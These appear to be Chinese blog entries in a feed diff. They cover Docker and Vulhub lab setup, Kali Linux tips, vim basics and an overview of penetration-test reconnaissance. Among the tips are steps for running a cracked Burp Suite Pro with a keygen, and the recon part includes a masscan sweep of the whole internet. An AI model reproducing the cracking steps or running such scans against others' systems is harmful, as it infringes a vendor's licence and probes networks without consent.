+<p>通过查询得知 Debian 9 对应的代号为 stretch ，之后执行以下命令写入docker软件源（其中 stretch 根据查询得到的代号自行修改）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &#x27;deb https://download.docker.com/linux/debian stretch stable&#x27; | sudo tee -a /etc/apt/sources.list.d/docker.list</span><br></pre></td></tr></table></figure>
+<p>正常写入之后如图</p>
+
+
+<h2 id="3-安装Docker"><a href="#3-安装Docker" class="headerlink" title="3. 安装Docker"></a>3. 安装Docker</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install docker-ce docker-ce-cli containerd.io -y</span><br></pre></td></tr></table></figure>
+
+<p>安装之后可以配置一下Docker镜像加速</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo mkdir -p /etc/docker</span><br><span class="line">sudo tee /etc/docker/daemon.json &lt;&lt;-&#x27;EOF&#x27;</span><br><span class="line">&#123;</span><br><span class="line">  &quot;registry-mirrors&quot;: [&quot;http://hub-mirror.c.163.com&quot;]</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure>
+<p>ps：阿里云有免费的加速服务，登录阿里云帐号-容器镜像服务-镜像加速器</p>
+<p>配置好后执行以下命令进行测试</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo docker run hello-world</span><br></pre></td></tr></table></figure>
+<p>正常反馈如图</p>
+
+
+<h2 id="4-卸载Docker"><a href="#4-卸载Docker" class="headerlink" title="4. 卸载Docker"></a>4. 卸载Docker</h2><h3 id="4-1-卸载软件"><a href="#4-1-卸载软件" class="headerlink" title="4.1 卸载软件"></a>4.1 卸载软件</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get purge docker-ce docker-ce-cli containerd.io</span><br></pre></td></tr></table></figure>
+<h3 id="4-2-删除镜像、容器、自定义配置等文件"><a href="#4-2-删除镜像、容器、自定义配置等文件" class="headerlink" title="4.2 删除镜像、容器、自定义配置等文件"></a>4.2 删除镜像、容器、自定义配置等文件</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo rm -rf /var/lib/docker</span><br></pre></td></tr></table></figure>
+
+<h1 id="二、安装Docker-Compose"><a href="#二、安装Docker-Compose" class="headerlink" title="二、安装Docker-Compose"></a>二、安装Docker-Compose</h1><h2 id="安装Docker-Compose"><a href="#安装Docker-Compose" class="headerlink" title="安装Docker-Compose"></a>安装Docker-Compose</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo curl -L &quot;https://github.com/docker/compose/releases/download/1.25.5/docker-compose-$(uname -s)-$(uname -m)&quot; -o /usr/local/bin/docker-compose</span><br><span class="line">sudo chmod +x /usr/local/bin/docker-compose</span><br><span class="line">docker-compose -v</span><br></pre></td></tr></table></figure>
+<p>回显版本号则安装成功</p>
+<h2 id="卸载Docker-Compose"><a href="#卸载Docker-Compose" class="headerlink" title="卸载Docker-Compose"></a>卸载Docker-Compose</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo rm /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure>
+
+<h1 id="三、配置Vulhub"><a href="#三、配置Vulhub" class="headerlink" title="三、配置Vulhub"></a>三、配置Vulhub</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#下载靶场</span><br><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br><span class="line"></span><br><span class="line">#看看都有哪些靶场</span><br><span class="line">ls vulhub</span><br><span class="line"></span><br><span class="line">#选择一个靶场，比如struts2的系列漏洞</span><br><span class="line">cd vulhub/struts2/s2-057/</span><br><span class="line"></span><br><span class="line">#启动靶场</span><br><span class="line">sudo docker-compose up -d</span><br><span class="line"></span><br><span class="line">#关闭靶场</span><br><span class="line">sudo docker-compose down</span><br><span class="line"></span><br><span class="line">#清理环境</span><br><span class="line">sudo docker rm $(docker ps -a -q)</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>web安全</category>
+      </categories>
+      <tags>
+        <tag>Kali Linux</tag>
+        <tag>Docker</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Kali配置问题汇总</title>
+    <url>/archives/53005.html</url>
+    <content><![CDATA[<h1 id="Q1：E-Sub-process-usr-bin-dpkg-returned-an-error-code-1"><a href="#Q1：E-Sub-process-usr-bin-dpkg-returned-an-error-code-1" class="headerlink" title="Q1：E: Sub-process /usr/bin/dpkg returned an error code (1)"></a>Q1：E: Sub-process /usr/bin/dpkg returned an error code (1)</h1>
+<p>解决方法：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo mousepad /var/lib/dpkg/status</span><br></pre></td></tr></table></figure>
+<p>删除发生错误的包即可</p>
+
+
+<h1 id="Q2：缺少工具"><a href="#Q2：缺少工具" class="headerlink" title="Q2：缺少工具"></a>Q2：缺少工具</h1><p>解决方法：</p>
+<ol>
+<li>直接使用<code>apt-get</code>进行安装</li>
+<li>安装工具集<br>Kali Linux 2019.03开始对默认工具集进行重大更改，默认工具集将分为三个主要类别<br>kali-linux-default，渗透测试人员必不可少的工具<br>kali-linux-large，面对一系列更广泛又不寻常的情况的渗透测试<br>kali-linux-everything，所有黑客工具<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get install -y kali-linux-everything</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h1 id="Q3：如何在kali上使用破解版burpsuite"><a href="#Q3：如何在kali上使用破解版burpsuite" class="headerlink" title="Q3：如何在kali上使用破解版burpsuite"></a>Q3：如何在kali上使用破解版burpsuite</h1><div class="note info no-icon"><p>准备工作：<br><span class="exturl" data-url="aHR0cHM6Ly96MHNlbi54eXovYXJjaGl2ZXMvOTExMS5odG1s">配置好jdk<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly9wYW4uYmFpZHUuY29tL3MvMXdvUWJmYUdrUjdJQnc5OFVCc2ppa3c=">Burpsuite<i class="fa fa-external-link-alt"></i></span> 提取码:gm3i</p>
+</div>
+<h2 id="1-将burpsuite移动到-usr-bin-文件夹下"><a href="#1-将burpsuite移动到-usr-bin-文件夹下" class="headerlink" title="1. 将burpsuite移动到/usr/bin/文件夹下"></a>1. 将burpsuite移动到/usr/bin/文件夹下</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo mv burp-loader-keygen.jar burpsuite_pro_v1.7.37.jar -t /usr/bin/</span><br></pre></td></tr></table></figure>
+<h2 id="2-编写运行脚本"><a href="#2-编写运行脚本" class="headerlink" title="2. 编写运行脚本"></a>2. 编写运行脚本</h2><ul>
+<li>先删除自带的免费burpsuite<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo rm -rf burpsuite</span><br></pre></td></tr></table></figure></li>
+<li>编写脚本<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo mousepad burpsuite</span><br><span class="line">#写入如下脚本并保存</span><br><span class="line">#!/bin/sh</span><br><span class="line">java -Xbootclasspath/p:/usr/bin/burp-loader-keygen.jar -jar /usr/bin/burpsuite_pro_v1.7.37.jar</span><br></pre></td></tr></table></figure>
+
+保存退出后赋予权限<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo chmod +x burpsuite</span><br></pre></td></tr></table></figure></li>
+<li>先运行一次loader激活burpsuite<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo burp-loader-keygen.jar</span><br></pre></td></tr></table></figure>
+ps:如果是xfce桌面环境需要在编辑完快捷方式之后在菜单栏中打开burpsuite然后复制loader中的字段去激活，而不是直接用loader去run<h2 id="3-编辑快捷方式"><a href="#3-编辑快捷方式" class="headerlink" title="3. 编辑快捷方式"></a>3. 编辑快捷方式</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /usr/share/applications</span><br><span class="line">sudo mousepad kali-burpsuite.desktop</span><br><span class="line">将Exec=sh -c &quot;java -jar /usr/bin/burpsuite&quot;改为Exec=sh -c &quot;/usr/bin/burpsuite&quot;</span><br></pre></td></tr></table></figure>
+之后就可以通过快捷方式运行了</li>
+</ul>
+<h1 id="Q4：kali修改DNS"><a href="#Q4：kali修改DNS" class="headerlink" title="Q4：kali修改DNS"></a>Q4：kali修改DNS</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#编辑文件</span><br><span class="line">sudo mousepad /etc/resolv.conf</span><br><span class="line"></span><br><span class="line">#添加DNS</span><br><span class="line">nameserver 114.114.114.114</span><br><span class="line">nameserver 8.8.8.8</span><br></pre></td></tr></table></figure>
+
+<h1 id="Q5：kali怎么使用ssr"><a href="#Q5：kali怎么使用ssr" class="headerlink" title="Q5：kali怎么使用ssr"></a>Q5：kali怎么使用ssr</h1><p>这里直接pass掉图形化的electron-ssr，我就没成功运行过<br>下面来介绍一下通过脚本运行ssr实现科学上网</p>
+<h2 id="1-下载安装脚本并赋予权限"><a href="#1-下载安装脚本并赋予权限" class="headerlink" title="1. 下载安装脚本并赋予权限"></a>1. 下载安装脚本并赋予权限</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget https://onlyless.github.io/ssr</span><br><span class="line">sudo mv ssr /usr/local/bin</span><br><span class="line">sudo chmod 766 /usr/local/bin/ssr</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="2-安装ssr"><a href="#2-安装ssr" class="headerlink" title="2. 安装ssr"></a>2. 安装ssr</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo ssr install</span><br></pre></td></tr></table></figure>
+<p>这里安装有点慢，添加<code>8.8.8.8</code>的DNS会快点</p>
+<h2 id="3-ssr配置"><a href="#3-ssr配置" class="headerlink" title="3. ssr配置"></a>3. ssr配置</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /usr/local/share/shadowsocksr/</span><br><span class="line">sudo mousepad config.json</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;server&quot;: &quot;0.0.0.0&quot;,	//服务器IP地址</span><br><span class="line">    &quot;server_ipv6&quot;: &quot;::&quot;,</span><br><span class="line">    &quot;server_port&quot;: 8388,	//服务器端口</span><br><span class="line">    &quot;local_address&quot;: &quot;127.0.0.1&quot;, </span><br><span class="line">    &quot;local_port&quot;: 1080,</span><br><span class="line"></span><br><span class="line">    &quot;password&quot;: &quot;m&quot;,		//密码</span><br><span class="line">    &quot;method&quot;: &quot;aes-128-ctr&quot;,	//加密</span><br><span class="line">    &quot;protocol&quot;: &quot;auth_aes128_md5&quot;,	//协议</span><br><span class="line">    &quot;protocol_param&quot;: &quot;&quot;,			//协议参数</span><br><span class="line">    &quot;obfs&quot;: &quot;plain&quot;,	//混淆</span><br><span class="line">    &quot;obfs_param&quot;: &quot;&quot;,	//混淆参数</span><br><span class="line">    &quot;speed_limit_per_con&quot;: 0,</span><br><span class="line">    &quot;speed_limit_per_user&quot;: 0,</span><br><span class="line"></span><br><span class="line">    &quot;additional_ports&quot; : &#123;&#125;, </span><br><span class="line">    &quot;additional_ports_only&quot; : false, </span><br><span class="line">    &quot;timeout&quot;: 120,</span><br><span class="line">    &quot;udp_timeout&quot;: 60,</span><br><span class="line">    &quot;dns_ipv6&quot;: false,</span><br><span class="line">    &quot;connect_verbose_info&quot;: 0,</span><br><span class="line">    &quot;redirect&quot;: &quot;&quot;,</span><br><span class="line">    &quot;fast_open&quot;: false</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>根据自己的节点信息进行修改之后保存</p>
+<h2 id="4-浏览器安装代理插件Proxy-SwitchyOmega"><a href="#4-浏览器安装代理插件Proxy-SwitchyOmega" class="headerlink" title="4. 浏览器安装代理插件Proxy SwitchyOmega"></a>4. 浏览器安装代理插件Proxy SwitchyOmega</h2><p>火狐浏览器-附加组件中搜索安装即可<br>配置如图</p>
+
+<p>之后在终端键入<code>ssr start</code>，浏览器切换代理为proxy即可使用</p>
+
+
+<h1 id="Q6-给git设置代理"><a href="#Q6-给git设置代理" class="headerlink" title="Q6:给git设置代理"></a>Q6:给git设置代理</h1><h2 id="1-设置全局代理"><a href="#1-设置全局代理" class="headerlink" title="1.设置全局代理"></a>1.设置全局代理</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git config --global http.proxy &#x27;socks5://127.0.0.1:1080&#x27;</span><br><span class="line">git config --global https.proxy &#x27;socks5://127.0.0.1:1080&#x27;</span><br></pre></td></tr></table></figure>
+<h2 id="2-设置针对github-com的全局代理"><a href="#2-设置针对github-com的全局代理" class="headerlink" title="2.设置针对github.com的全局代理"></a>2.设置针对github.com的全局代理</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#只对github.com</span><br><span class="line">git config --global http.https://github.com.proxy socks5://127.0.0.1:1080</span><br><span class="line"></span><br><span class="line">#取消代理</span><br><span class="line">git config --global --unset http.https://github.com.proxy</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>web安全</category>
+      </categories>
+      <tags>
+        <tag>Kali Linux</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>vim基础</title>
+    <url>/archives/53339.html</url>
+    <content><![CDATA[<h2 id="一、基本语法"><a href="#一、基本语法" class="headerlink" title="一、基本语法"></a>一、基本语法</h2><ol>
+<li><p><code>vi -r</code>：恢复崩溃时正在编辑的文件</p>
+</li>
+<li><p><code>vi -R</code>：以只读方式打开文件</p>
+</li>
+<li><p><code>vi +n</code>：打开文件时光标在第n行，若不指定则默认最后一行</p>
+</li>
+</ol>
+<h2 id="二、基本模式"><a href="#二、基本模式" class="headerlink" title="二、基本模式"></a>二、基本模式</h2><ol>
+<li><p>命令模式</p>
+</li>
+<li><p>编辑模式</p>
+</li>
+<li><p>末行模式</p>
+</li>
+<li><p>模式间切换<br> （1）命令模式 → 编辑模式：有6种方式</p>
+ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令a：在光标后插入内容</span><br><span class="line">命令A：在本行行末插入内容</span><br><span class="line">命令i：在光标前插入内容</span><br><span class="line">命令I：在本行行首插入内容</span><br><span class="line">命令o：在光标下行插入内容</span><br><span class="line">命令O：在光标上行插入内容</span><br></pre></td></tr></table></figure>
+<p> （2）编辑模式 → 命令模式：esc键<br> （3）命令模式 → 末行模式：冒号<br> （4）末行模式 → 命令模式：esc键</p>
+</li>
+</ol>
+<h2 id="三、基本操作"><a href="#三、基本操作" class="headerlink" title="三、基本操作"></a>三、基本操作</h2><h3 id="在命令模式下："><a href="#在命令模式下：" class="headerlink" title="在命令模式下："></a>在命令模式下：</h3><ol>
+<li><p>连按2次<code>d</code>：剪切整行内容<br> 在<code>dd</code>前加数字，表示删几行，如<code>2dd</code>，表示删2行内容</p>
+</li>
+<li><p><code>p</code>：粘贴内容</p>
+</li>
+<li><p><code>/+搜索内容</code>：搜索关键字，按n键向后遍历</p>
+</li>
+<li><p><code>?+搜索内容</code>：搜索关键字，按n键向前遍历</p>
+</li>
+</ol>
+<h3 id="在末行模式下："><a href="#在末行模式下：" class="headerlink" title="在末行模式下："></a>在末行模式下：</h3><ol>
+<li><p><code>w</code>：保存</p>
+</li>
+<li><p><code>q</code>：退出</p>
+</li>
+<li><p><code>!</code>：强制执行</p>
+</li>
+<li><p>替换关键字</p>
+ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%s/原文/替换文/g</span><br></pre></td></tr></table></figure>
+<p> 如<code>%s/lcl/zxy/g</code>,表示将原文中<code>lcl</code>的内容替换为<code>zxy</code>，<code>/g</code>表示不提示直接执行</p>
+</li>
+<li><p>若要指定a行到b行间替换</p>
+ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a,bs/原文/替换文/g</span><br></pre></td></tr></table></figure>
+<p> 如<code>1,5s/lcl/zxy/g</code>,表示将原文<code>第1行</code>到<code>第5行</code>中<code>lcl</code>的内容替换为<code>zxy</code></p>
+</li>
+</ol>
+]]></content>
+      <categories>
+        <category>嵌入式开发</category>
+      </categories>
+      <tags>
+        <tag>Ubuntu</tag>
+        <tag>vim</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>信息搜集总结篇</title>
+    <url>/archives/20469.html</url>
+    <content><![CDATA[<div class="note info no-icon"><h1 id="写在开头"><a href="#写在开头" class="headerlink" title="写在开头"></a>写在开头</h1><p>对于目标的信息收集，主要针对目标的服务器系统、数据库系统、中间件系统、应用程序系统、以及边界设备等信息，以及收集针对于系统管理员的信息收集。</p>
+<ul>
+<li>对于信息收集方式，主要分为以下两类：<ol>
+<li>主动信息收集：直接与目标进行交互，通过对交互过程中的信息进行收集<br>例如：Nmap扫描、Burpsuite站点地图收集等</li>
+<li>被动信息收集：通过第三方引擎与目标交互，或不予目标交互查询具体数据库，获得目标的信息<br>例如：Google Hacking、Shodan查询等</li>
+</ol>
+</li>
+</ul>
+</div>
+
+<h1 id="一、Whois信息"><a href="#一、Whois信息" class="headerlink" title="一、Whois信息"></a>一、Whois信息</h1><h2 id="0x01-域名（Domain-Name）"><a href="#0x01-域名（Domain-Name）" class="headerlink" title="0x01 域名（Domain Name）"></a>0x01 域名（Domain Name）</h2><p>由一串用点分隔的名字组成的Internet上某一台计算机或计算机组的名称，用于在数据传输时标识计算机的电子方位。<br>例如：51cto.com<br>对于 edu.51cto.com 以及 <span class="exturl" data-url="aHR0cDovL3d3dy41MWN0by5jb20v">www.51cto.com<i class="fa fa-external-link-alt"></i></span> 是该域名对应的子域名，而edu和www都是对应的主机头<br>浏览网站过程：（从DNS服务器获得指定域名对应的IP地址）</p>
+
+
+<h2 id="0x02-Whois"><a href="#0x02-Whois" class="headerlink" title="0x02 Whois"></a>0x02 Whois</h2><p>用来查询域名的IP以及所有者等信息的传输协议。简单说，Whois就是一个用来查询域名是否已经被注册，以及注册域名的详细信息的数据库（如域名所有人、域名注册商）<br>不同域名后缀的Whois信息需要到不同的Whois数据库查询。如.com的Whois数据库和.edu的就不同。每个域名或IP的Whois信息由对应的管理机构保存，例如，以.com结尾的域名的Whois信息由.com域名运营商VeriSign管理，中国国家顶级域名.cn域名由CNNIC(中国互联网络信息中心)管理<br>Whois协议。其基本内容是，先向服务器的TCP端口43建立一个连接，发送查询关键字并加上回车换行，然后接收服务器的查询结果。</p>
+
+
+<h2 id="0x03-Whois查询"><a href="#0x03-Whois查询" class="headerlink" title="0x03 Whois查询"></a>0x03 Whois查询</h2><p>Whois查询的重要性：通过Whois查询可以获得域名注册者邮箱地址等信息。一般情况下对于中小型网站域名注册者就是网站管理员。利用搜索引擎对Whois查询到的信息进行搜索，获取更多域名注册者的个人信息。</p>
+<p>Whois查询方法：</p>
+<h3 id="1-Web接口查询"><a href="#1-Web接口查询" class="headerlink" title="1. Web接口查询"></a>1. Web接口查询</h3><div class="note info no-icon"><p><span class="exturl" data-url="aHR0cHM6Ly93aG9pcy5hbGl5dW4uY29tLw==">阿里云Whois查询<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cDovL3dob2lzLmNoaW5hei5jb20v">站长之家Whois查询<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly93d3cud2hvaXMzNjUuY29tL2NuLw==">全球WHOIS查询<i class="fa fa-external-link-alt"></i></span></p>
+</div>
+
+
+
+<h3 id="2-通过Whois命令行查询"><a href="#2-通过Whois命令行查询" class="headerlink" title="2. 通过Whois命令行查询"></a>2. 通过Whois命令行查询</h3><p>在Kali linux下自带了Whois查询工具，通过命令 <code>whois [域名]</code> 进行查询</p>
+
+
+<h2 id="0x04-备案信息查询"><a href="#0x04-备案信息查询" class="headerlink" title="0x04 备案信息查询"></a>0x04 备案信息查询</h2><p>ICP备案介绍：Internet Content Provider网络内容提供商。<br>《互联网信息服务管理办法》指出互联网信息服务分为经营性和非经营性两类。国家对经营性互联网信息服务实行许可制度；对非经营性互联网信息服务实行备案制度。未取得许可或者未履行备案手续的，不得从事互联网信息服务。在中华人民共和国境内提供非经营性互联网信息服务，应当依法履行备案手续。未经国家机关单位许可备案，不得在中华人民共和国境内从事非经营性互联网信息服务。</p>
+<div class="note info"><p>为毛要备案？<br>为了防止在网上从事非法的网站经营活动，打击不良互联网信息的传播，如果网站不备案的话，很有可能被查处以后关停<br>（博主是境外域名商购买的域名，所以不需要备案）</p>
+</div>
+
+<p>ICP备案查询方法：</p>
+<div class="note info no-icon"><p>Web接口查询：<br><span class="exturl" data-url="aHR0cDovL2JlaWFuLm1paXQuZ292LmNuL3B1Ymxpc2gvcXVlcnkvaW5kZXhGaXJzdC5hY3Rpb24=">工信部备案管理系统<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cDovL3d3dy5iZWlhbmJlaWFuLmNvbS8=">ICP备案查询网<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly93d3cudGlhbnlhbmNoYS5jb20v">天眼查<i class="fa fa-external-link-alt"></i></span></p>
+</div>
+
+<h1 id="二、子域名信息"><a href="#二、子域名信息" class="headerlink" title="二、子域名信息"></a>二、子域名信息</h1><div class="note info"><p>顶级域名是指”.com”、”.net”、”.org”、”.cn”等等</p>
+</div>
+
+<h2 id="0x01-子域名（Subdomain-Name）"><a href="#0x01-子域名（Subdomain-Name）" class="headerlink" title="0x01 子域名（Subdomain Name）"></a>0x01 子域名（Subdomain Name）</h2><p>凡顶级域名前加前缀的都是该顶级域名的子域名，而子域名根据技术的多少分为二级子域名，三级子域名以及多级子域名。<br>我国在国际互联网络信息中心正式注册并运行的顶级域名是.cn，这也是我国的一级域名。在顶级域名之下，我国的二级域名又分为类别域名和行政区域名两类。类别域名共6个， 包括用于科研机构的.ac；用于工商金融企业的.com；用于教育机构的.edu；用于政府部门的.gov；用于互联网络信息中心和运行中心的.net；用于非盈利组织的.org。而行政区域名有34个，分别对应于我国各省、自治区和直辖市。</p>
+<h2 id="0x02-挖掘子域名的重要性"><a href="#0x02-挖掘子域名的重要性" class="headerlink" title="0x02 挖掘子域名的重要性"></a>0x02 挖掘子域名的重要性</h2><p>子域名是某个主域的二级域名或者多级域名，在防御措施严密情况下无法直接拿下主域，那么就可以采用迂回战术拿下子域名，然后无限靠近主域。</p>
+<div class="note info no-icon"><p>例如：<br><span class="exturl" data-url="aHR0cDovL3d3dy54eHh4eC5jb20v">www.xxxxx.com<i class="fa fa-external-link-alt"></i></span> 主域不存在漏洞，并且防护措施严密<br>而二级域名  edu.xxxxx.com存在漏洞，并且防护措施松散</p>
+</div>
+
+<h2 id="0x03-子域名挖掘方法"><a href="#0x03-子域名挖掘方法" class="headerlink" title="0x03 子域名挖掘方法"></a>0x03 子域名挖掘方法</h2><h3 id="1-子域名挖掘工具"><a href="#1-子域名挖掘工具" class="headerlink" title="1. 子域名挖掘工具"></a>1. 子域名挖掘工具</h3><p>如：Maltego CE、wydomain、subDomainsBrute、dnsmaper、Layer子域名挖掘机</p>
+
+
+<h3 id="2-搜索引擎挖掘"><a href="#2-搜索引擎挖掘" class="headerlink" title="2. 搜索引擎挖掘"></a>2. 搜索引擎挖掘</h3><p>Google Hacking语法<br>如：在Google中输入 site:sina.com</p>
+
+
+<h3 id="3-第三方网站查询"><a href="#3-第三方网站查询" class="headerlink" title="3. 第三方网站查询"></a>3. 第三方网站查询</h3><p><span class="exturl" data-url="aHR0cDovL3Rvb2wuY2hpbmF6LmNvbS9zdWJkb21haW4=">站长之家<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly9kbnNkdW1wc3Rlci5jb20v">DNSdumpster<i class="fa fa-external-link-alt"></i></span></p>
+<h3 id="4-证书透明度公开日志枚举"><a href="#4-证书透明度公开日志枚举" class="headerlink" title="4. 证书透明度公开日志枚举"></a>4. 证书透明度公开日志枚举</h3><p><span class="exturl" data-url="aHR0cDovL2NlbnN5cy5pby8=">Censys<i class="fa fa-external-link-alt"></i></span></p>
+
+
+<h3 id="5-其他途径"><a href="#5-其他途径" class="headerlink" title="5. 其他途径"></a>5. 其他途径</h3><p><span class="exturl" data-url="aHR0cHM6Ly9waHBpbmZvLm1lL2RvbWFpbg==">在线子域名查询<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cDovL2Rucy5haXpoYW4uY29tLw==">爱站网查询<i class="fa fa-external-link-alt"></i></span></p>
+<h1 id="三、web站点信息"><a href="#三、web站点信息" class="headerlink" title="三、web站点信息"></a>三、web站点信息</h1><h2 id="0x01-CMS指纹识别"><a href="#0x01-CMS指纹识别" class="headerlink" title="0x01 CMS指纹识别"></a>0x01 CMS指纹识别</h2><p>CMS（内容管理系统），又称整站系统或文章系统。用于网站内容管理。用户只需要下载对应的CMS软件包，部署搭建，就可以直接利用CMS，简单方便。但是各种CMS都具有其独特的结构命名规则和特定的文件内容，因此可以利用这些内容来获取CMS站点的具体软件CMS与版本。<br>常见CMS：dedecms（织梦）、Discuz、Phpcms等<br>CMS识别工具：</p>
+<ol>
+<li>在线工具<br><span class="exturl" data-url="aHR0cDovL3doYXR3ZWIuYnVnc2NhbmVyLmNvbS9sb29rLw==">whatweb<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cDovL3d3dy55dW5zZWUuY24vZmluZ2VyLmh0bWw=">云悉<i class="fa fa-external-link-alt"></i></span></li>
+<li>本地工具<br>whatweb<br><span class="exturl" data-url="aHR0cHM6Ly9wYW4uYmFpZHUuY29tL3NoYXJlL2xpbms/c2hhcmVpZD00MzczNzYmdWs9MzUyNjgzMjM3NA==">御剑web指纹识别程序<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL01zMHgwL0RheXU=">大禹CMS识别程序<i class="fa fa-external-link-alt"></i></span></li>
+</ol>
+<h2 id="0x02-针对CMS查询漏洞"><a href="#0x02-针对CMS查询漏洞" class="headerlink" title="0x02 针对CMS查询漏洞"></a>0x02 针对CMS查询漏洞</h2><p>对于查询到的CMS可以利用 <span class="exturl" data-url="aHR0cHM6Ly93d3cuc2VlYnVnLm9yZy9zZWFyY2gv">Seebug<i class="fa fa-external-link-alt"></i></span> 查询指定CMS的漏洞</p>
+
+
+<h2 id="0x03-敏感目录信息"><a href="#0x03-敏感目录信息" class="headerlink" title="0x03 敏感目录信息"></a>0x03 敏感目录信息</h2><p>针对目标Web目录结构和敏感隐藏文件探测是非常重要的，在探测过程中很有可能会探测出后台页面、上传页面、数据库文件、甚至是网站源代码文件压缩包等<br>探测工具：</p>
+<ol>
+<li>御剑后台扫描工具</li>
+<li>wwwscan命令行工具</li>
+<li>dirb命令行工具</li>
+<li>dirbuster扫描工具</li>
+</ol>
+<h2 id="0x04-针对WordPress的站点测试"><a href="#0x04-针对WordPress的站点测试" class="headerlink" title="0x04 针对WordPress的站点测试"></a>0x04 针对WordPress的站点测试</h2><p>WordPress是使用PHP语言开发的博客平台，用户可以在支持PHP和MySQL数据库的服务器上架设属于自己的网站，也可以把 WordPress当作一个内容管理系统（CMS）来使用<br>针对WordPress测试，可以使用wpscan工具进行对应安全测试</p>
+
+
+<h1 id="四、端口信息"><a href="#四、端口信息" class="headerlink" title="四、端口信息"></a>四、端口信息</h1><h2 id="0x01-端口-port"><a href="#0x01-端口-port" class="headerlink" title="0x01 端口 (port)"></a>0x01 端口 (port)</h2><p>如果把IP地址比作一间房子 ，端口就是出入这间房子的门。真正的房子只有几个门，但是一个IP地址的端口可以有65536（即：2^16）个之多！端口是通过端口号来标记的，端口号只有整数，范围是从0到65535（2^16-1）<br>例如计算机中的80端口、21端口、23端口等<br>在计算机中每一个端口代表一个服务。在Windows命令行中使用 netstat -anbo 显示开放端口</p>
+
+
+<h2 id="0x02-端口信息收集"><a href="#0x02-端口信息收集" class="headerlink" title="0x02 端口信息收集"></a>0x02 端口信息收集</h2><p>对于收集目标机器端口状态可以使用工具来进行测试。工具原理：使用TCP或者UDP等协议向目标端口发送指定标志位等的数据包，等待目标返回数据包，以此来判断端口状态。</p>
+<h3 id="1-使用-nmap-探测"><a href="#1-使用-nmap-探测" class="headerlink" title="1. 使用 nmap 探测"></a>1. 使用 nmap 探测</h3><p>-A选项用于使用进攻性（Aggressive）方式扫描；-T4指定扫描过程使用的时序（Timing），总有6个级别（0-5），级别越高，扫描速度越快，但也容易被防火墙或IDS检测并屏蔽掉，在网络通讯状况良好的情况推荐使用T4；-v表示显示冗余（verbosity）信息，在扫描过程中显示扫描的细节，从而让用户了解当前的扫描状态。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -A -v -T4 [IP]</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-使用masscan探测"><a href="#2-使用masscan探测" class="headerlink" title="2. 使用masscan探测"></a>2. 使用masscan探测</h3><p>对整个互联网进行扫描并把扫描的结果保存在一个XML文件中</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">masscan 0.0.0.0/0 -p0-65535 -oX scan.xml</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-使用在线网站探测"><a href="#3-使用在线网站探测" class="headerlink" title="3. 使用在线网站探测"></a>3. 使用在线网站探测</h3><p><span class="exturl" data-url="aHR0cDovL3Rvb2wuY2hpbmF6LmNvbS9wb3J0Lw==">站长之家<i class="fa fa-external-link-alt"></i></span></p>
+<h2 id="0x03-端口攻击"><a href="#0x03-端口攻击" class="headerlink" title="0x03 端口攻击"></a>0x03 端口攻击</h2><p>针对不同的端口具有不同的攻击方法</p>
+<p>例如：针对远程连接服务端口</p>
+<table>
+<thead>
